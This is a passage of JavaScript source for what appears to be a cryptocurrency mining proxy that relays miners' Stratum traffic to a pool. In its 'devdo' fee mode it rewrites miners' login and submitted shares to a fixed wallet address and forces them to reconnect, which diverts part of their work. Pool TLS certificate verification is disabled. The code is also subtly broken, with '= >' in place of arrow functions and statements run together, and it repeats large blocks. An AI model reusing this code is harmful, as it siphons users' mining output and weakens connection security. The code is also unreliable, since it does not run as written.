                                ser = tls.connect({
                                    port: dk4,
                                    host: ym2,
                                    rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({
                                    port: dk4,
                                    host: ym2
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        } catch(ere) {
                        client.end();
                        client.destroy();
                        }
                    }
                    client.on('data',
                    function(data) { //接收到矿机发来数据
                        if (data3.length != 0) {
                            setTimeout(function() { //检测矿机是否掉线，15分钟无数据往来判定为掉线
                                try {
                                    suanliarr[data3[0] + '.' + data3[1]].o = true;
                                    suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                    setTimeout(function() {
                                        try {
                                            if (((new Date().getTime()) - suanliarr[data3[0] + '.' + data3[1]].t1) > 14.5 * 60 * 1000) { //最近一次数据往来发生在14.5分钟前，判定掉线
                                                suanliarr[data3[0] + '.' + data3[1]].o = false;
                                                ser.end();
                                                ser.destroy();
                                                client.end();
                                                client.destroy();
                                            }

                                        } catch(err444) {
                                            console.log(err444)
                                        }

                                    },
                                    15 * 60 * 1000)
                                } catch(err4443) {
                                    console.log(err4443)
                                }
                            },
                            20)
                        }
                        try {
                            data.toString().split('\n').forEach(jsonDataStr = >{
                                if (trim(jsonDataStr).length) {
                                    let data2 = JSON.parse(trim(jsonDataStr));
                                    if (data2.method == 'mining.authorize') { //如果矿机发来登录数据，记录并登录
                                        data3 = data2.params[0].split('.');
                                        if (!data3[1]) {data3[1] = 'noname';}
                                        suanliarr[data3[0] + '.' + data3[1]] = {};
                                        suanliarr[data3[0] + '.' + data3[1]].a = data3[0];
                                        suanliarr[data3[0] + '.' + data3[1]].o = true;
                                        suanliarr[data3[0] + '.' + data3[1]].n = data3[1];
                                        suanliarr[data3[0] + '.' + data3[1]].h = '0M';
                                        suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                        suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                        if (devdo) {data2.params[0] = csaddress + '.' + devfeeget}
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    } else if (data3.length != 0) {
                                        if (data2.method == 'mining.set_difficulty') {
                                            ser.write(data)
                                        } else if (data2.method == 'mining.subscribe') { //如果矿机发来请求工作任务命令
                                            ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                        } else {
                                            if (data2.method == 'mining.submit') { //如果矿机发来上报Share命令，上报检测是否进入抽水时间
                                                //suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                                if (devdo) {
                                                    data2.params[0] = csaddress + '.' + devfeeget 
                                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                } else {
                                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                                if (clidevdo != devdo) { //如果已经进入抽水时间，但矿机还未开始抽水
                                                    ser.end() ser.destroy(); //关掉原矿机连接
                                                    client.write(Buffer.from('{"id": 1, "method": "client.reconnect", "params": []}\n')) 
                                                    client.end() 
                                                    client.destroy();
                                                }
                                            } else {
                                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                            }
                                        }
                                    } else {
                                        try {
                                            ser.write(data)
                                        } catch(eyrr) {
                                            client.end() 
                                            client.destroy() 
                                            try {ser.end();ser.destroy()} catch(eqrr) {}
                                        }
                                    }
                                }
                            });
                        } catch(err) {
                            try {ser.write(data)} catch(err343) {console.log(err343)}
                        }
                    });
                    client.on('error',function(err) {});
                    client.on('close',function() {try {ser.end();ser.destroy();} catch(err222) {}});
                } else {try {client.end();client.destroy(); } catch(err222) {}}
            });
            server.listen(dk, '0.0.0.0',function() {
                server.on('close',function() {});
                server.on('error',function(err) {});
            });
        } catch(err0101) { //中转服务出现故障，10秒钟后重启
            console.log('serverdown', err0101) 
            setTimeout(function() {startproserver()},10000)
        }
    } else {
        try {
            server = net.createServer(function(client) { //每一个矿机都有一个独立的client，以下数据为该矿机独有数据
                var nandu = false;
                var clidevdo = devdo;
                if (isconnet) {
                    var data3 = []; //存储矿机挖矿地址和矿机名
                    var ser;
                    if (!devdo) {
                        try {
                            if (isssl2) {
                                ser = tls.connect({port: dk2,host: ym,rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({port: dk2,host: ym
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        } catch(ere) {
                            if (isssl2) {
                                ser = tls.connect({
                                    port: dk2_backup,
                                    host: ym_backup,
                                    rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({
                                    port: dk2_backup,
                                    host: ym_backup
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        }
                    } else {
                        try {
                            if (isssl2) {
                                ser = tls.connect({
                                    port: dk4,
                                    host: ym2,
                                    rejectUnauthorized: false
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            } else {
                                ser = net.connect({
                                    port: dk4,
                                    host: ym2
                                },
                                function() {
                                    this.on('data',function(data) { //接收到矿池发来数据
                                        try {
                                            data.toString().split('\n').forEach(jsonDataStr = >{
                                                if (trim(jsonDataStr).length) {
                                                    let data2 = JSON.parse(trim(jsonDataStr));
                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                            })
                                        } catch(err) {
                                            try {client.write(data)} catch(err2) {} //错误处理机制
                                        }
                                    }) 
                                    this.on('error',function(err) {console.log('ser_err9', err)});
                                })
                            }
                        } catch(ere) {
                        client.end();
                        client.destroy();
                        }
                    }
                    client.on('data',
                    function(data) { //接收到矿机发来数据
                        if (data3.length != 0) {
                            setTimeout(function() { //检测矿机是否掉线，15分钟无数据往来判定为掉线
                                try {
                                    suanliarr[data3[0] + '.' + data3[1]].o = true;
                                    suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                    setTimeout(function() {
                                        try {
                                            if (((new Date().getTime()) - suanliarr[data3[0] + '.' + data3[1]].t1) > 14.5 * 60 * 1000) { //最近一次数据往来发生在14.5分钟前，判定掉线
                                                suanliarr[data3[0] + '.' + data3[1]].o = false;
                                                ser.end();
                                                ser.destroy();
                                                client.end();
                                                client.destroy();
                                            }

                                        } catch(err444) {
                                            console.log(err444)
                                        }

                                    },
                                    15 * 60 * 1000)
                                } catch(err4443) {
                                    console.log(err4443)
                                }
                            },
                            20)
                        }
                        try {
                            data.toString().split('\n').forEach(jsonDataStr = >{
                                if (trim(jsonDataStr).length) {
                                    let data2 = JSON.parse(trim(jsonDataStr));
                                    if (data2.method == 'mining.authorize') { //如果矿机发来登录数据，记录并登录
                                        data3 = data2.params[0].split('.');
                                        if (!data3[1]) {data3[1] = 'noname';}
                                        suanliarr[data3[0] + '.' + data3[1]] = {};
                                        suanliarr[data3[0] + '.' + data3[1]].a = data3[0];
                                        suanliarr[data3[0] + '.' + data3[1]].o = true;
                                        suanliarr[data3[0] + '.' + data3[1]].n = data3[1];
                                        suanliarr[data3[0] + '.' + data3[1]].h = '0M';
                                        suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                        suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                        if (devdo) {data2.params[0] = csaddress + '.' + devfeeget}
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    } else if (data3.length != 0) {
                                        if (data2.method == 'mining.set_difficulty') {
                                            ser.write(data)
                                        } else if (data2.method == 'mining.subscribe') { //如果矿机发来请求工作任务命令
                                            ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                        } else {
                                            if (data2.method == 'mining.submit') { //如果矿机发来上报Share命令，上报检测是否进入抽水时间
                                                //suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                                if (devdo) {
                                                    data2.params[0] = csaddress + '.' + devfeeget 
                                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                } else {
                                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                }
                                                if (clidevdo != devdo) { //如果已经进入抽水时间，但矿机还未开始抽水
                                                    ser.end() ser.destroy(); //关掉原矿机连接
                                                    client.write(Buffer.from('{"id": 1, "method": "client.reconnect", "params": []}\n')) 
                                                    client.end() 
                                                    client.destroy();
                                                }
                                            } else {
                                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                            }
                                        }
                                    } else {
                                        try {
                                            ser.write(data)
                                        } catch(eyrr) {
                                            client.end() 
                                            client.destroy() 
                                            try {ser.end();ser.destroy()} catch(eqrr) {}
                                        }
                                    }
                                }
                            });
                        } catch(err) {
                            try {ser.write(data)} catch(err343) {console.log(err343)}
                        }
                    });
                    client.on('error',function(err) {});
                    client.on('close',function() {try {ser.end();ser.destroy();} catch(err222) {}});
                } else {try {client.end();client.destroy(); } catch(err222) {}}
            });
            server.listen(dk, '0.0.0.0',function() {
                server.on('close',function() {});
                server.on('error',function(err) {});
            });
        } catch(err0101) { //中转服务出现故障，10秒钟后重启
            console.log('serverdown', err0101) 
            setTimeout(function() {startproserver()},10000)
        }
    }
}
if (!ispro) {
    startserver()
} else {
    startproserver()
}
app.listen(dk3)
